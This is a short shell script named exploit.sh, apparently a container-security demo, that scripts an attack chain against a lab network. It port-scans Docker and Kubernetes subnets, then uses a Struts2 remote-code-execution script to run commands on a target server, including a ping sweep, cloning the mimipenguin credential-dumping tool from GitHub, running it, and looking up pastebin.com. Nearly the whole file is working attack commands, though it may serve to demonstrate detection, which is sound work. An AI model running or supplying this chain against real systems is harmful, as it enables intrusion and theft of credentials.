# exploit.sh
# maintainer Neil Carpenter <neil@twistlock.com>
#
#
# Let's generate a port scan

nmap -p 80,8080,8081,8082,8083,8084,2375,10250,6443,9998 172.18.0.1-254
nmap -p 80,8080,8081,8082,8083,8084,2375,10250,6443,9998 172.17.0.1-254

# Sleeps are there to let actions complete

python2 /struts2/strutsrce.py --target=http://struts.server:8080/showcase.action --cmd='uname -a'
sleep 5
python2 /struts2/strutsrce.py --target=http://struts.server:8080/showcase.action --cmd='ps -ef'
python2 /struts2/strutsrce.py --target=http://struts.server:8080/showcase.action --cmd='touch /tmp/output'
python2 /struts2/strutsrce.py --target=http://struts.server:8080/showcase.action --cmd='/usr/bin/nmap -sP 172.18.0.1-254'
python2 /struts2/strutsrce.py --target=http://struts.server:8080/showcase.action --cmd='/usr/bin/git clone https://github.com/huntergregal/mimipenguin.git'
sleep 60
python2 /struts2/strutsrce.py --target=http://struts.server:8080/showcase.action --cmd='./mimipenguin/mimipenguin.sh'
python2 /struts2/strutsrce.py --target=http://struts.server:8080/showcase.action --cmd='nslookup pastebin.com'
